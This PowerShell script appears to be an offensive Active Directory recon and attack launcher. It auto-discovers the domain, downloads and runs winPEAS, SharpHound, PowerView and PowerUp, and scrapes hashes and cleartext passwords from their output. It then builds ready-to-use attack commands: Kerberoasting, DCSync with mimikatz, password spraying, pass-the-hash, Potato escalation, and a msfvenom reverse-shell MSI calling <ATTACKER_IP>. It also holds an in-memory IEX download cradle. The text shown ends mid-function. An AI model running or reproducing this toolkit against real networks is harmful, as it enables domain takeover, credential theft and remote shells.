#Requires -Version 3
<#
.SYNOPSIS
    AD Recon - pure PowerShell launcher. No Python required.
    Run this when you only have a CMD or PowerShell session on the target.

.USAGE
    # From PowerShell:
    powershell -ExecutionPolicy Bypass -File launch.ps1

    # From CMD:
    powershell -NoProfile -ExecutionPolicy Bypass -File launch.ps1

    # From memory (no file on disk) - paste this one-liner into any PS prompt:
    IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8080/launch.ps1')
#>

Set-StrictMode -Off
$ErrorActionPreference = "SilentlyContinue"

# ---------------------------------------------------------------------------
# Colors via Write-Host
# ---------------------------------------------------------------------------
function Write-Good  ($m) { Write-Host "  [+] $m" -ForegroundColor Green  }
function Write-Bad   ($m) { Write-Host "  [-] $m" -ForegroundColor Red    }
function Write-Info  ($m) { Write-Host "  [*] $m" -ForegroundColor Cyan   }
function Write-Warn  ($m) { Write-Host "  [!] $m" -ForegroundColor Yellow }
function Write-Dim   ($m) { Write-Host "      $m" -ForegroundColor DarkGray }
function Write-Section ($t) {
    Write-Host ""
    Write-Host ("-" * 60) -ForegroundColor Magenta
    Write-Host "  $t"     -ForegroundColor Magenta
    Write-Host ("-" * 60) -ForegroundColor Magenta
    Write-Host ""
}

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
Clear-Host
Write-Host @"
  ___  ____     ____  ___  __  ___  _  _
 / _ \|  _ \   |  _ \| __|/ _|/ _ \| \| |
| (_) | (_) |  | |_) | _|| (_| (_) | .  |
 \___/|____/   |_|__/|___|\___\___/|_|\_|

     Windows Active Directory Recon Tool  [PowerShell Edition]
     For educational use only.
"@ -ForegroundColor Red

# ---------------------------------------------------------------------------
# Phase 0 - Auto-Discovery
# ---------------------------------------------------------------------------
Write-Section "PHASE 0 - Environment Auto-Discovery"
Write-Info "Scanning your environment..."

$disc = @{
    Username       = "$env:USERDOMAIN\$env:USERNAME"
    IsAdmin        = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    IsSystem       = ($env:USERNAME -eq "SYSTEM")
    Domain         = $env:USERDNSDOMAIN
    Hostname       = $env:COMPUTERNAME
    LocalIP        = $null
    DcIP           = $null
    DcHostname     = $null
    Internet       = $false
}

# Local IP
$disc.LocalIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -notmatch "^127\." -and $_.IPAddress -notmatch "^169\." } |
    Select-Object -First 1).IPAddress

# Domain from nltest
$nltestOut = & nltest /dsgetdc:($disc.Domain) 2>$null
if ($nltestOut) {
    foreach ($line in $nltestOut) {
        if ($line -match "DC: \\\\(.+)") { $disc.DcHostname = $Matches[1].Trim() }
    }
}

# DC IP from DNS
if ($disc.DcHostname) {
    $disc.DcIP = [System.Net.Dns]::GetHostAddresses($disc.DcHostname) |
        Where-Object { $_.AddressFamily -eq "InterNetwork" } |
        Select-Object -ExpandProperty IPAddressToString -First 1
}
if (-not $disc.DcIP -and $disc.Domain) {
    $disc.DcIP = [System.Net.Dns]::GetHostAddresses($disc.Domain) |
        Where-Object { $_.AddressFamily -eq "InterNetwork" } |
        Select-Object -ExpandProperty IPAddressToString -First 1
}

# Internet check
try {
    $r = [System.Net.WebRequest]::Create("http://8.8.8.8")
    $r.Timeout = 3000
    $r.GetResponse() | Out-Null
    $disc.Internet = $true
} catch {}

# Print summary
Write-Host "  Current User"
Write-Good "Logged in as:          $($disc.Username)"
if ($disc.IsSystem)     { Write-Host "  [+] Privilege level:         " -NoNewline; Write-Host "NT AUTHORITY\SYSTEM - already at top" -ForegroundColor Red }
elseif ($disc.IsAdmin)  { Write-Host "  [+] Privilege level:         " -NoNewline; Write-Host "Local Administrator" -ForegroundColor Yellow }
else                    { Write-Good "Privilege level:       Standard user - privesc paths will be enumerated" }

Write-Host ""
Write-Host "  Machine"
Write-Good "Hostname:              $($disc.Hostname)"
if ($disc.LocalIP)  { Write-Good "Local IP:              $($disc.LocalIP)" }
else                { Write-Warn "Local IP:              not detected" }

Write-Host ""
Write-Host "  Active Directory"
if ($disc.Domain)      { Write-Good "Domain:                $($disc.Domain)" }
else                   { Write-Warn "Domain:                not detected" }
if ($disc.DcIP)        { Write-Good "DC IP:                 $($disc.DcIP)" }
else                   { Write-Warn "DC IP:                 not detected" }
if ($disc.DcHostname)  { Write-Good "DC Hostname:           $($disc.DcHostname)" }

Write-Host ""
Write-Host "  Connectivity"
if ($disc.Internet) { Write-Good "Internet:              reachable - tools will be downloaded if missing" }
else                { Write-Warn "Internet:              not reachable - offline mode" }

# ---------------------------------------------------------------------------
# Phase 1 - Wizard
# ---------------------------------------------------------------------------
Write-Host ""
Read-Host "  Press Enter to continue to the setup wizard"
Write-Section "PHASE 1 - Setup Wizard"

# Auth
Write-Host "  Authentication" -ForegroundColor White
if ($disc.IsSystem) {
    Write-Good "Running as SYSTEM - using machine account context for AD enumeration."
    $auth = @{ Type = "system"; Username = ""; Password = ""; Hash = "" }
} else {
    Write-Host @"

  [1] Already running as a domain user (no extra creds)   <- default
  [2] I have a domain username + password
  [3] I have an NTLM hash (Pass-the-Hash)
  [4] No credentials - null session only
"@
    $choice = Read-Host "  > Choice [1-4]"
    if (-not $choice) { $choice = "1" }

    $auth = @{ Type = "domain_joined"; Username = ""; Password = ""; Hash = "" }
    switch ($choice) {
        "2" {
            $auth.Type     = "user_pass"
            $auth.Username = Read-Host "  > Domain username (e.g. CORP\john)"
            $secPw         = Read-Host "  > Password" -AsSecureString
            $auth.Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                             [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secPw))
        }
        "3" {
            $auth.Type     = "ntlm_hash"
            $auth.Username = Read-Host "  > Domain username"
            $auth.Hash     = Read-Host "  > NTLM hash (LM:NT or just NT)"
        }
        "4" { $auth.Type = "nothing" }
    }
}

# Target - confirm or fill gaps
Write-Host ""
Write-Host "  Target" -ForegroundColor White

$domainVal = $disc.Domain
if (-not $domainVal) {
    Write-Warn "Could not auto-detect domain. Please enter it."
    $domainVal = Read-Host "  > Domain name (e.g. corp.local)"
} else {
    $inp = Read-Host "  > Domain name [$domainVal]"
    if ($inp) { $domainVal = $inp }
}

$dcIpVal = $disc.DcIP
if (-not $dcIpVal) {
    Write-Warn "Could not auto-detect DC IP. Please enter it."
    $dcIpVal = Read-Host "  > Domain Controller IP"
} else {
    $inp = Read-Host "  > Domain Controller IP [$dcIpVal]"
    if ($inp) { $dcIpVal = $inp }
}

$target = @{
    Domain     = $domainVal
    DcIP       = $dcIpVal
    DcHostname = $disc.DcHostname
}

# Output dir
$outDir = Read-Host "  > Output directory [.\results]"
if (-not $outDir) { $outDir = ".\results" }
$rawDir = Join-Path $outDir "raw"
$toolsDir = Join-Path $PSScriptRoot "tools"
New-Item -ItemType Directory -Force -Path $outDir, $rawDir, $toolsDir | Out-Null

# Auto-scope
$scope = @{
    RunWinPEAS    = -not $disc.IsSystem
    RunSharpHound = ($domainVal -and $auth.Type -ne "nothing")
    RunPowerView  = ($domainVal -and $auth.Type -ne "nothing")
    RunSeatbelt   = $true
    RunPowerUp    = -not $disc.IsSystem
}

Write-Host ""
Write-Host "  What will run (auto-selected):" -ForegroundColor White
foreach ($kv in $scope.GetEnumerator()) {
    $icon   = if ($kv.Value) { "[+]" } else { "[-]" }
    $color  = if ($kv.Value) { "Green" } else { "DarkGray" }
    Write-Host "    $icon $($kv.Key)" -ForegroundColor $color
}

# ---------------------------------------------------------------------------
# Download helper
# ---------------------------------------------------------------------------
function Get-Tool ($Name, $Url, $Dest) {
    if (Test-Path $Dest) { Write-Good "$Name already exists."; return $true }
    if (-not $disc.Internet) { Write-Warn "$Name not found and no internet - skipping."; return $false }
    Write-Info "Downloading $Name..."
    try {
        (New-Object System.Net.WebClient).DownloadFile($Url, $Dest)
        Write-Good "Downloaded $Name ? $Dest"
        return $true
    } catch {
        Write-Bad "Failed to download $Name`: $_"
        return $false
    }
}

# ---------------------------------------------------------------------------
# Phase 2 - Enumeration
# ---------------------------------------------------------------------------
Write-Section "PHASE 2 - Enumeration"

$results = @{}

# winPEAS
if ($scope.RunWinPEAS) {
    $dest = Join-Path $toolsDir "winPEASx64.exe"
    $ok   = Get-Tool "winPEAS" "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" $dest
    if ($ok) {
        Write-Info "Running winPEAS... (this takes 1-5 minutes)"
        $out = & $dest 2>&1 | Out-String
        $outFile = Join-Path $rawDir "winpeas.txt"
        $out | Out-File $outFile -Encoding UTF8
        $results["winpeas"] = $out
        Write-Good "winPEAS done ? $outFile"
    }
}

# SharpHound
if ($scope.RunSharpHound) {
    $dest = Join-Path $toolsDir "SharpHound.exe"
    $ok   = Get-Tool "SharpHound" "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe" $dest
    if ($ok) {
        Write-Info "Running SharpHound..."
        $shArgs = @("-c", "All", "--zipfilename", "bloodhound_data", "--outputdirectory", $rawDir, "--domain", $domainVal)
        if ($dcIpVal) { $shArgs += @("--domaincontroller", $dcIpVal) }
        $out = & $dest @shArgs 2>&1 | Out-String
        $out | Out-File (Join-Path $rawDir "sharphound.txt") -Encoding UTF8
        $results["sharphound"] = $out
        Write-Good "SharpHound done - ZIP saved to $rawDir"
    }
}

# PowerView
if ($scope.RunPowerView) {
    $dest = Join-Path $toolsDir "PowerView.ps1"
    $ok   = Get-Tool "PowerView" "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" $dest
    if ($ok) {
        Write-Info "Running PowerView AD enumeration..."
        $pvOut = ""
        try {
            . $dest
            $sections = [ordered]@{
                "DOMAIN INFO"             = { Get-Domain -Domain $domainVal 2>$null | Format-List | Out-String }
                "DOMAIN CONTROLLERS"      = { Get-DomainController -Domain $domainVal 2>$null | Format-List | Out-String }
                "DOMAIN USERS"            = { Get-DomainUser -Domain $domainVal 2>$null | Select-Object samaccountname,description,memberof,pwdlastset | Format-Table -AutoSize | Out-String }
                "KERBEROASTABLE USERS"    = { Get-DomainUser -SPN -Domain $domainVal 2>$null | Select-Object samaccountname,serviceprincipalname | Format-Table -AutoSize | Out-String }
                "ASREP ROASTABLE USERS"   = { Get-DomainUser -PreauthNotRequired -Domain $domainVal 2>$null | Select-Object samaccountname | Format-Table -AutoSize | Out-String }
                "DOMAIN ADMINS"           = { Get-DomainGroupMember "Domain Admins" -Domain $domainVal 2>$null | Select-Object MemberName,MemberSID | Format-Table -AutoSize | Out-String }
                "DOMAIN COMPUTERS"        = { Get-DomainComputer -Domain $domainVal 2>$null | Select-Object dnshostname,operatingsystem | Format-Table -AutoSize | Out-String }
                "UNCONSTRAINED DELEGATION"= { Get-DomainComputer -Unconstrained -Domain $domainVal 2>$null | Select-Object dnshostname | Format-Table -AutoSize | Out-String }
                "CONSTRAINED DELEGATION"  = { Get-DomainUser -TrustedToAuth -Domain $domainVal 2>$null | Select-Object samaccountname,"msds-allowedtodelegateto" | Format-Table -AutoSize | Out-String }
                "ACL MISCONFIGS"          = { Find-InterestingDomainAcl -Domain $domainVal -ResolveGUIDs 2>$null | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword" } | Format-Table -AutoSize | Out-String }
                "GPO LIST"                = { Get-DomainGPO -Domain $domainVal 2>$null | Select-Object displayname | Format-Table -AutoSize | Out-String }
                "PASSWORD POLICY"         = { Get-DomainPolicyData -Domain $domainVal 2>$null | Select-Object -ExpandProperty SystemAccess | Format-List | Out-String }
                "DOMAIN TRUSTS"           = { Get-DomainTrust -Domain $domainVal 2>$null | Format-Table -AutoSize | Out-String }
                "SMB SHARES"              = { Find-DomainShare -Domain $domainVal 2>$null | Format-Table -AutoSize | Out-String }
            }
            foreach ($sec in $sections.GetEnumerator()) {
                $pvOut += "`n=== $($sec.Key) ===`n"
                try { $pvOut += & $sec.Value } catch {}
            }
        } catch { Write-Warn "PowerView error: $_" }
        $outFile = Join-Path $rawDir "powerview.txt"
        $pvOut | Out-File $outFile -Encoding UTF8
        $results["powerview"] = $pvOut
        Write-Good "PowerView done ? $outFile"
    }
}

# PowerUp
if ($scope.RunPowerUp) {
    $dest = Join-Path $toolsDir "PowerUp.ps1"
    $ok   = Get-Tool "PowerUp" "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" $dest
    if ($ok) {
        Write-Info "Running PowerUp privilege escalation checks..."
        try {
            . $dest
            $puOut = "=== POWERUP PRIVESC CHECKS ===`n"
            $puOut += Invoke-AllChecks 2>$null | Format-List | Out-String
        } catch { $puOut = "PowerUp error: $_" }
        $outFile = Join-Path $rawDir "powerup.txt"
        $puOut | Out-File $outFile -Encoding UTF8
        $results["powerup"] = $puOut
        Write-Good "PowerUp done ? $outFile"
    }
}

# Seatbelt
if ($scope.RunSeatbelt) {
    $dest = Join-Path $toolsDir "Seatbelt.exe"
    if (Test-Path $dest) {
        Write-Info "Running Seatbelt..."
        $out = & $dest "-group=all" 2>&1 | Out-String
        $out | Out-File (Join-Path $rawDir "seatbelt.txt") -Encoding UTF8
        $results["seatbelt"] = $out
        Write-Good "Seatbelt done ? $(Join-Path $rawDir 'seatbelt.txt')"
    } else {
        Write-Warn "Seatbelt.exe not found in tools/ - skipping. (Compile it manually from GhostPack/Seatbelt)"
    }
}

# ---------------------------------------------------------------------------
# Phase 3 - Parse & Report
# ---------------------------------------------------------------------------
Write-Section "PHASE 3 - Report Generation"
Write-Info "Building intelligence tables and reports..."

# -- Loot extraction ----------------------------------------------------------
function Get-Section ($text, $header) {
    if (-not $text) { return "" }
    $pattern = "===\s*$([regex]::Escape($header))\s*===\s*`n([\s\S]*?)(?====|\z)"
    $m = [regex]::Match($text, $pattern, "IgnoreCase")
    if ($m.Success) { return $m.Groups[1].Value.Trim() }
    return ""
}

function Get-TableRows ($section) {
    $lines = $section -split "`n" | Where-Object { $_.Trim() -and ($_ -notmatch "^[-\s]+$") }
    if ($lines.Count -gt 2) { return $lines[2..($lines.Count-1)] }
    return @()
}

$loot = @{
    DomainUsers       = @()
    DomainAdmins      = @()
    DomainComputers   = @()
    DomainControllers = @()
    Kerberoastable    = @()
    AsrepRoastable    = @()
    Spns              = @()
    HashesFound       = @()
    PasswordsFound    = @()
    PasswordPolicy    = @()
    DomainTrusts      = @()
    Gpos              = @()
    InterestingFiles  = @()
}

$pv = $results["powerview"]
if ($pv) {
    foreach ($row in (Get-TableRows (Get-Section $pv "DOMAIN USERS"))) {
        $name = ($row.Trim() -split "\s+")[0]
        if ($name) { $loot.DomainUsers += $name }
    }
    foreach ($row in (Get-TableRows (Get-Section $pv "DOMAIN ADMINS"))) {
        $name = ($row.Trim() -split "\s+")[0]
        if ($name) { $loot.DomainAdmins += $name }
    }
    foreach ($row in (Get-TableRows (Get-Section $pv "DOMAIN COMPUTERS"))) {
        $name = ($row.Trim() -split "\s+")[0]
        if ($name) { $loot.DomainComputers += $name }
    }
    foreach ($row in (Get-TableRows (Get-Section $pv "KERBEROASTABLE USERS"))) {
        $parts = $row.Trim() -split "\s+"
        if ($parts[0]) { $loot.Kerberoastable += $parts[0] }
        if ($parts.Count -gt 1) { $loot.Spns += "$($parts[0]) ? $($parts[1])" }
    }
    foreach ($row in (Get-TableRows (Get-Section $pv "ASREP ROASTABLE USERS"))) {
        $name = ($row.Trim() -split "\s+")[0]
        if ($name) { $loot.AsrepRoastable += $name }
    }
    foreach ($line in ((Get-Section $pv "PASSWORD POLICY") -split "`n" | Where-Object { $_.Trim() })) {
        if ($line -match "MinimumPasswordLength|LockoutBadCount|PasswordHistorySize|MaximumPasswordAge|PasswordComplexity") {
            $loot.PasswordPolicy += $line.Trim()
        }
    }
    foreach ($row in (Get-TableRows (Get-Section $pv "DOMAIN TRUSTS"))) {
        if ($row.Trim()) { $loot.DomainTrusts += $row.Trim() }
    }
    foreach ($row in (Get-TableRows (Get-Section $pv "GPO LIST"))) {
        $name = ($row.Trim() -split "\s+")[0]
        if ($name) { $loot.Gpos += $name }
    }
    foreach ($line in ((Get-Section $pv "DOMAIN CONTROLLERS") -split "`n")) {
        if ($line -match "Name\s*:\s*(.+)") { $loot.DomainControllers += $Matches[1].Trim() }
    }
}

$wp = $results["winpeas"]
if ($wp) {
    $loot.HashesFound     = ([regex]::Matches($wp, "[a-fA-F0-9]{32}:[a-fA-F0-9]{32}") | Select-Object -ExpandProperty Value -Unique)[0..19]
    $loot.PasswordsFound  = ([regex]::Matches($wp, "(?i)(?:password|pwd|pass)\s*[=:]\s*(\S{4,})") | ForEach-Object { $_.Groups[1].Value } | Select-Object -Unique)[0..19]
    $loot.InterestingFiles = ([regex]::Matches($wp, "(?i)C:\\[^\s\n]*\.(txt|xml|ini|config|cfg|bat|ps1|kdbx)") | Select-Object -ExpandProperty Value -Unique)[0..19]
}

# -- Findings detection --------------------------------------------------------
$findings = [System.Collections.Generic.List[hashtable]]::new()

function Add-Finding ($Id, $Title, $Severity, $Category, $Description, $Evidence, $Tool) {
    $findings.Add(@{
        Id          = $Id
        Title       = $Title
        Severity    = $Severity
        Category    = $Category
        Description = $Description
        Evidence    = @($Evidence | Where-Object { $_ })
        Tool        = $Tool
    })
}

if ($pv) {
    if ($loot.Kerberoastable.Count -gt 0) {
        Add-Finding "kerberoastable_users" "Kerberoastable Service Accounts ($($loot.Kerberoastable.Count) found)" "HIGH" "Kerberos" "Accounts with SPNs - any domain user can request their TGS and crack offline." $loot.Kerberoastable "PowerView"
    }
    if ($loot.AsrepRoastable.Count -gt 0) {
        Add-Finding "asrep_roastable" "AS-REP Roastable Accounts ($($loot.AsrepRoastable.Count) found)" "HIGH" "Kerberos" "Pre-auth disabled - AS-REP hash requestable without any credentials." $loot.AsrepRoastable "PowerView"
    }
    $uncRows = Get-TableRows (Get-Section $pv "UNCONSTRAINED DELEGATION") | Where-Object { $_ -notmatch "DC|DOMAIN.CONTROLLER" }
    if ($uncRows.Count -gt 0) {
        Add-Finding "unconstrained_delegation" "Unconstrained Delegation (Non-DC)" "CRITICAL" "Delegation" "Non-DC machine(s) with unconstrained delegation. Coerce DC auth ? capture TGT ? DCSync." $uncRows "PowerView"
    }
    $aclRows = Get-TableRows (Get-Section $pv "ACL MISCONFIGS")
    $critAcl = $aclRows | Where-Object { $_ -match "GenericAll|WriteDACL|WriteOwner" }
    $highAcl = $aclRows | Where-Object { $_ -match "GenericWrite|ForceChangePassword" }
    if ($critAcl.Count -gt 0) { Add-Finding "acl_critical" "Critical ACL Misconfigurations" "CRITICAL" "ACL" "GenericAll/WriteDACL/WriteOwner found - leads to DCSync or DA group membership." $critAcl "PowerView" }
    if ($highAcl.Count -gt 0) { Add-Finding "acl_high" "High-Risk ACL Misconfigurations" "HIGH" "ACL" "GenericWrite/ForceChangePassword - targeted Kerberoasting or password reset without auth." $highAcl "PowerView" }

    $polLines = Get-Section $pv "PASSWORD POLICY"
    if ($polLines -match "LockoutBadCount\s*=\s*0") {
        Add-Finding "no_lockout" "No Account Lockout Policy" "HIGH" "PasswordPolicy" "LockoutBadCount = 0 - spray passwords freely with no risk of locking accounts." @("LockoutBadCount = 0") "PowerView"
    }
    if ($loot.DomainTrusts.Count -gt 0) {
        Add-Finding "domain_trusts" "Domain Trusts Identified" "MEDIUM" "Enumeration" "Bidirectional or SID-history trusts can allow cross-domain privilege escalation." $loot.DomainTrusts "PowerView"
    }
}

if ($wp) {
    if ($wp -match "AlwaysInstallElevated.*1") {
        Add-Finding "always_install_elevated" "AlwaysInstallElevated Enabled" "CRITICAL" "LocalPrivesc" "Any user can install MSI packages as SYSTEM." @("AlwaysInstallElevated = 1") "winPEAS"
    }
    if ($loot.HashesFound.Count -gt 0) {
        Add-Finding "hashes_found" "NTLM Hashes Extracted" "CRITICAL" "CredentialAccess" "NTLM hashes found - crack offline or use for Pass-the-Hash." $loot.HashesFound "winPEAS"
    }
    if ($loot.PasswordsFound.Count -gt 0) {
        Add-Finding "passwords_found" "Cleartext Passwords Found" "CRITICAL" "CredentialAccess" "Possible cleartext passwords found in files or registry." $loot.PasswordsFound "winPEAS"
    }
    $unquoted = [regex]::Matches($wp, "(?i)Unquoted Service Path[^\n]*\n([^\n]+)") | ForEach-Object { $_.Groups[1].Value.Trim() }
    if ($unquoted.Count -gt 0) { Add-Finding "unquoted_service_paths" "Unquoted Service Paths ($($unquoted.Count) found)" "HIGH" "LocalPrivesc" "Plant a binary in the unquoted path - runs as SYSTEM on service restart." $unquoted "winPEAS" }
    $autologon = [regex]::Matches($wp, "(?i)(AutoAdminLogon|DefaultUserName|DefaultPassword)[^\n]*") | ForEach-Object { $_.Value }
    if ($autologon.Count -gt 0) { Add-Finding "autologon_creds" "AutoLogon Credentials in Registry" "CRITICAL" "CredentialAccess" "Plaintext credentials stored for automatic logon." $autologon "winPEAS" }
}

$pu = $results["powerup"]
if ($pu) {
    $modFiles = [regex]::Matches($pu, "(?i)ModifiableFile\s*:\s*([^\n]+)") | ForEach-Object { $_.Groups[1].Value.Trim() }
    if ($modFiles.Count -gt 0) { Add-Finding "modifiable_service_files" "Modifiable Service Binaries" "HIGH" "LocalPrivesc" "Current user can overwrite service binary that runs as SYSTEM." $modFiles "PowerUp" }
    $tokenPrivs = [regex]::Matches($pu, "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege|SeDebugPrivilege") | ForEach-Object { $_.Value } | Sort-Object -Unique
    if ($tokenPrivs.Count -gt 0) { Add-Finding "token_privileges" "Dangerous Token Privileges" "HIGH" "LocalPrivesc" "SeImpersonate/SeDebug found - Potato attacks or SYSTEM process injection." $tokenPrivs "PowerUp" }
}

# Sort by severity
$sevOrder = @{ CRITICAL=0; HIGH=1; MEDIUM=2; LOW=3; INFO=4 }
$sorted = $findings | Sort-Object { $sevOrder[$_.Severity] }

Write-Good "Detected $($sorted.Count) finding(s)."

# -- HTML helpers --------------------------------------------------------------
function Esc ($s) { [System.Web.HttpUtility]::HtmlEncode($s) }
$web = [System.Reflection.Assembly]::LoadWithPartialName("System.Web") | Out-Null
# Fallback HTML escape without System.Web
function HtmlEsc ($s) {
    $s = "$s"
    $s = $s.Replace("&","&amp;").Replace("<","&lt;").Replace(">","&gt;").Replace('"',"&quot;")
    return $s
}

$sevColor = @{ CRITICAL="#ff4444"; HIGH="#ff8800"; MEDIUM="#e3b341"; LOW="#58a6ff"; INFO="#8b949e" }

function Render-LootCard ($title, $items, $headerClass, $daSet) {
    $hdr = "<div class='loot-card-header $headerClass'>$(HtmlEsc $title)</div>"
    if (-not $items -or $items.Count -eq 0) {
        $body = "<div class='loot-empty'>Nothing found</div>"
    } else {
        $rows = ""
        foreach ($item in ($items | Select-Object -First 30)) {
            $cell = HtmlEsc $item
            if ($daSet -and $daSet -contains $item) { $cell = "<span style='color:#ff4444;font-weight:700;'>$cell ?</span>" }
            $rows += "<tr><td>$cell</td></tr>"
        }
        $body = "<table class='loot-table'><tbody>$rows</tbody></table>"
    }
    return "<div class='loot-card'>$hdr<div class='loot-card-body'>$body</div></div>"
}

function Render-FindingCard ($f) {
    $sev   = $f.Severity
    $color = $sevColor[$sev]
    $pill  = "<span class='sev-pill' style='background:$color;color:#000;'>$sev</span>"
    $tool  = "<span class='finding-tool'>$(HtmlEsc $f.Tool)</span>"
    $title = "<span class='finding-title'>$(HtmlEsc $f.Title)</span>"
    $hdr   = "<div class='finding-header'>$pill$title$tool</div>"
    $desc  = "<p class='finding-desc'>$(HtmlEsc $f.Description)</p>"
    $evItems = ($f.Evidence | Select-Object -First 20 | ForEach-Object { "<li>$(HtmlEsc $_)</li>" }) -join ""
    $ev    = if ($evItems) { "<ul class='evidence-list'>$evItems</ul>" } else { "" }
    $body  = "<div class='finding-body'>$desc$ev</div>"
    return "<div class='finding'>$hdr$body</div>"
}

# Attack command templates
$attackTemplates = @{
    "kerberoastable_users" = @{
        Title = "Kerberoasting"; Phase = "Credential Access"
        Steps = @(
            @{ Desc = "Request TGS hashes (Windows)";       Cmd = "Rubeus.exe kerberoast /domain:$domainVal /dc:$dcIpVal /outfile:$outDir\kerberoast_hashes.txt" }
            @{ Desc = "Crack offline";                       Cmd = "hashcat -m 13100 $outDir\kerberoast_hashes.txt <WORDLIST> --force"; Note = "Mode 13100 = Kerberos 5 TGS-REP etype 23" }
            @{ Desc = "Alternative from Linux (user+pass)";  Cmd = "impacket-GetUserSPNs $domainVal/<USERNAME>:<PASSWORD> -dc-ip $dcIpVal -request -outputfile kerberoast.txt" }
        )
    }
    "asrep_roastable" = @{
        Title = "AS-REP Roasting"; Phase = "Credential Access"
        Steps = @(
            @{ Desc = "Request AS-REP hashes (no creds)";   Cmd = "Rubeus.exe asreproast /domain:$domainVal /dc:$dcIpVal /format:hashcat /outfile:$outDir\asrep_hashes.txt" }
            @{ Desc = "Crack offline";                       Cmd = "hashcat -m 18200 $outDir\asrep_hashes.txt <WORDLIST> --force"; Note = "Mode 18200 = Kerberos 5 AS-REP etype 23" }
        )
    }
    "unconstrained_delegation" = @{
        Title = "Unconstrained Delegation ? DCSync"; Phase = "Privilege Escalation ? Domain Takeover"
        Steps = @(
            @{ Desc = "Monitor for incoming TGTs";           Cmd = "Rubeus.exe monitor /interval:5 /nowrap" }
            @{ Desc = "Coerce DC auth (PrinterBug)";         Cmd = "SpoolSample.exe $dcIpVal $($disc.LocalIP)"; Note = "Or: impacket-PetitPotam $($disc.LocalIP) $dcIpVal" }
            @{ Desc = "Inject captured TGT";                 Cmd = "Rubeus.exe ptt /ticket:<BASE64_TICKET>" }
            @{ Desc = "DCSync - dump all hashes";            Cmd = "mimikatz.exe `"lsadump::dcsync /domain:$domainVal /all /csv`" exit" }
        )
    }
    "acl_critical" = @{
        Title = "Critical ACL Abuse ? DCSync"; Phase = "Privilege Escalation"
        Steps = @(
            @{ Desc = "Grant yourself DCSync rights via WriteDACL"; Cmd = "Add-DomainObjectAcl -TargetIdentity $domainVal -PrincipalIdentity $($disc.Username) -Rights DCSync -Verbose" }
            @{ Desc = "DCSync - dump all hashes";                   Cmd = "impacket-secretsdump $domainVal/$($disc.Username)@$dcIpVal -just-dc-ntlm" }
            @{ Desc = "GenericAll on user ? reset password";        Cmd = "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force)" }
        )
    }
    "no_lockout" = @{
        Title = "Password Spraying"; Phase = "Credential Access"
        Steps = @(
            @{ Desc = "Spray from Windows";  Cmd = "Invoke-DomainPasswordSpray -Password <PASSWORD> -Domain $domainVal -OutFile $outDir\spray_results.txt"; Note = "No lockout - safe to spray" }
            @{ Desc = "Spray from Linux";    Cmd = "crackmapexec smb $dcIpVal -u <USERS_FILE> -p <PASSWORD> --continue-on-success" }
        )
    }
    "always_install_elevated" = @{
        Title = "AlwaysInstallElevated ? SYSTEM Shell"; Phase = "Local Privilege Escalation"
        Steps = @(
            @{ Desc = "Generate MSI payload"; Cmd = "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o $outDir\evil.msi" }
            @{ Desc = "Install as SYSTEM";    Cmd = "msiexec /quiet /qn /i $outDir\evil.msi" }
        )
    }
    "token_privileges" = @{
        Title = "Token Privilege Abuse ? SYSTEM"; Phase = "Local Privilege Escalation"
        Steps = @(
            @{ Desc = "GodPotato (modern Windows)"; Cmd = "GodPotato.exe -cmd `"cmd /c <PAYLOAD>`"" }
            @{ Desc = "PrintSpoofer alternative";   Cmd = "PrintSpoofer64.exe -i -c cmd.exe" }
            @{ Desc = "RoguePotato alternative";    Cmd = "RoguePotato.exe -r <ATTACKER_IP> -e cmd.exe -l 9999" }
        )
    }
    "hashes_found" = @{
        Title = "Pass-the-Hash / Hash Cracking"; Phase = "Credential Access ? Lateral Movement"
        Steps = @(
            @{ Desc = "Crack NTLM hashes";           Cmd = "hashcat -m 1000 $outDir\hashes.txt <WORDLIST> --force"; Note = "Mode 1000 = NTLM" }
            @{ Desc = "Pass-the-Hash (Windows)";     Cmd = "mimikatz.exe `"sekurlsa::pth /user:<USER> /domain:$domainVal /ntlm:<HASH> /run:cmd.exe`"" }
            @{ Desc = "Pass-the-Hash (Linux)";       Cmd = "impacket-psexec $domainVal/<USER>@$dcIpVal -hashes :<HASH>" }
        )
    }
}

function Render-AttackCard ($f) {
    $tmpl = $attackTemplates[$f.Id]
    if (-not $tmpl) { return "" }
    $title   = HtmlEsc $f.Title
    $phaseTag = "<span class='phase-tag'>$(HtmlEsc $tmpl.Phase)</span>"
    $blocks  = ""
    foreach ($step in $tmpl.Steps) {
        $cmd  = HtmlEsc $step.Cmd
        # Known real values ? orange
        $cmd  = $cmd -replace [regex]::Escape((HtmlEsc $domainVal)), "<span class='val'>$(HtmlEsc $domainVal)</span>"
        if ($dcIpVal)         { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $dcIpVal)),         "<span class='val'>$(HtmlEsc $dcIpVal)</span>" }
        if ($disc.LocalIP)    { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $disc.LocalIP)),    "<span class='val'>$(HtmlEsc $disc.LocalIP)</span>" }
        if ($disc.Username)   { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $disc.Username)),   "<span class='val'>$(HtmlEsc $disc.Username)</span>" }
        if ($outDir)          { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $outDir)),           "<span class='val'>$(HtmlEsc $outDir)</span>" }
        # Placeholders ? red
        $cmd  = $cmd -replace "&lt;([A-Z_]+)&gt;", "<span class='placeholder'>&lt;`$1&gt;</span>"
